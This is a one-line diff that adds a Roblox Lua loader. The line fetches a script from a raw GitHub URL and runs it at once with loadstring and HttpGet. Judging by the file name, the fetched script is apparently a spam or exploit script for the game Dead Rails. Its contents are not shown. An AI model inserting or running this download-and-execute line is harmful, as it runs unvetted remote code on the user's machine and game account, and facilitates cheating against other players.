@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/partsoapmakerremain/loaders/main/loaders/event-dead-rails-spam1-b9i49pa8m5kmo4.lua"))()
